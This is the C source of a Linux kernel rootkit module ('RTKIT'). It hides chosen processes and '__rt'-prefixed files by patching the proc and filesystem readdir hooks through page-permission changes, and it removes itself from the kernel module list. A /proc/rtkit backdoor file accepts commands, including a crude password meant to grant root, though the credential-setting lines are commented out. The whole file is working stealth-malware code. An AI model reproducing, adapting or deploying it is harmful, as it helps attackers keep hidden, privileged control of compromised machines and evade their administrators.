#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/uaccess.h>


#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })


#define MAX_PIDS 50

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");


struct proc_dir_entry {
        unsigned int low_ino;
        umode_t mode;
        nlink_t nlink;
        kuid_t uid;
        kgid_t gid;
        loff_t size;
        const struct inode_operations *proc_iops;
        const struct file_operations *proc_fops;
        struct proc_dir_entry *next, *parent, *subdir;
        void *data;
        atomic_t count;         /* use count */
        atomic_t in_use;        /* number of callers into module in progress; */
                        /* negative -> it's going away RSN */
        struct completion *pde_unload_completion;
        struct list_head pde_openers;   /* who did ->open, but not ->release */
        spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
        u8 namelen;
        char name[];
};


//STATIC VARIABLES SECTION
//we don't want to have it visible in kallsyms and have access to it all the time
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, struct dir_context *);
static int (*fs_readdir_orig)  (struct file *, struct dir_context *);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

//MODULE HELPERS
void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 
void module_show(void)
{
	int result;
	if (!module_hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
	module_hidden = !module_hidden;
}

//PAGE RW HELPERS
static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long) addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
}
//CALLBACK SECTION
static int proc_filldir_new(void *ptr, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i=0; i < current_pid; i++) {
		if (!strcmp(name, pids_to_hide[i])) return 0;
	}
	if (!strcmp(name, "rtkit")) return 0;
	return proc_filldir_orig(ptr, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *f, struct dir_context *d)
{
	int ret;
//	char* buf;
//	char* tmp;
	
	struct dir_context dc = (struct dir_context) {
		.actor = proc_filldir_new,
		.pos = d->pos
	};

	// this global state is probably not a good idea anymore
	// TODO: fix this
	proc_filldir_orig = d->actor;
	memcpy((void*)d, (void*)&dc, sizeof(struct dir_context));

#if 0
	buf = (char*)kmalloc(4096, GFP_KERNEL);
	tmp = d_path(&f->f_path, buf, 4096);
	if (tmp)
		printk("Path: %s\n", tmp);
	kfree(buf);
#endif


	ret = proc_readdir_orig(f, d);
	
	return ret;

}

static int fs_filldir_new(void *ptr, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
//	printk("%s\n", name);
	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
	return fs_filldir_orig(ptr, name, namelen, offset, ino, d_type);
}

static int fs_readdir_new(struct file *f, struct dir_context *d)
{
	int ret;
	//char* buf;
	//char* tmp;
	
	struct dir_context dc = (struct dir_context) {
		.actor = fs_filldir_new,
		.pos = d->pos
	};

	// this global state is probably not a good idea anymore
	// TODO: fix this
	fs_filldir_orig = d->actor;
	memcpy((void*)d, (void*)&dc, sizeof(struct dir_context));

#if 0
	buf = (char*)kmalloc(4096, GFP_KERNEL);
	tmp = d_path(&f->f_path, buf, 4096);
	if (tmp)
		printk("Path: %s\n", tmp);
	kfree(buf);
#endif


	ret = fs_readdir_orig(f, d);
	
	
	//ret = fs_readdir_orig(f, &dc);
	return ret;
//	return 0;
}


/**
154  *      seq_read -      ->read() method for sequential files.
155  *      @file: the file to read from
156  *      @buf: the buffer to read to
157  *      @size: the maximum number of bytes to read
158  *      @ppos: the current position in the file
159  *
160  *      Ready-made ->f_op->read()
161  */

//static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
ssize_t rtkit_read(struct file *f, char __user *buffer, size_t s, loff_t *off) {
	size_t size;


//	printk("read %u\n", s);
	
	sprintf(module_status, 
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

	size = strlen(module_status);

	if (*off >= size) return 0;
  
	copy_to_user(buffer, module_status, size);
	*off = size;  
	return size;
}
//static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)

static int rtkit_write(struct file *file, const char __user *buff2, size_t count, loff_t *offset)
{
	char buff[1024];
	if (count>=1024)
		return count;

	copy_from_user(buff, buff2, count); 

	printk("%s\n", buff);
	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
		struct cred *credentials = prepare_creds();
		//credentials->uid = credentials->euid = 0;
		//credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
		module_show();
	}
	
        return count;
}

//INITIALIZING/CLEANING HELPER METHODS SECTION
static void procfs_clean(void)
{
	if (proc_rtkit != NULL) {
		remove_proc_entry("rtkit", NULL);
		proc_rtkit = NULL;
	}
	if (proc_fops != NULL && proc_readdir_orig != NULL) {
		set_addr_rw(proc_fops);
		proc_fops->iterate = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}
	
static void fs_clean(void)
{
	if (fs_fops != NULL && fs_readdir_orig != NULL) {
		set_addr_rw(fs_fops);
		fs_fops->iterate = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init procfs_init(void)
{

	static const struct file_operations proc_file_fops = {
		.owner = THIS_MODULE,
		.read  = rtkit_read,
		.write = rtkit_write
	};

	proc_rtkit = proc_create("rtkit", 0, NULL, &proc_file_fops);
	if (proc_rtkit == NULL) return 0;

#if 0
	//new entry in proc root with 666 rights
	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
	proc_rtkit->read_proc = rtkit_read;
	proc_rtkit->write_proc = rtkit_write;
#endif
	
	//substitute proc readdir to our wersion (using page mode change)
	proc_root = proc_rtkit->parent;
	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
		return 0;
	}

	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_readdir_orig = proc_fops->iterate;
	set_addr_rw(proc_fops);
	proc_fops->iterate = proc_readdir_new;
	set_addr_ro(proc_fops);
	
	return 1;
}

static int __init fs_init(void)
{
	struct file *etc_filp;
	
	//get file_operations of /etc
	etc_filp = filp_open("/etc", O_RDONLY, 0);
	if (etc_filp == NULL) return 0;
	fs_fops = (struct file_operations *) etc_filp->f_op;
	filp_close(etc_filp, NULL);
	
	//substitute readdir of fs on which /etc is
	fs_readdir_orig = fs_fops->iterate;
	set_addr_rw(fs_fops);
	fs_fops->iterate = fs_readdir_new;
	set_addr_ro(fs_fops);

	return 1;
}


//MODULE INIT/EXIT
static int __init rootkit_init(void)
{
	if (!procfs_init() || !fs_init()) {
		procfs_clean();
		fs_clean();
		return 1;
	}
	module_hide();
	//printk("rk loaded\n");		
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	//printk("unload\n");		
	procfs_clean();
	fs_clean();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
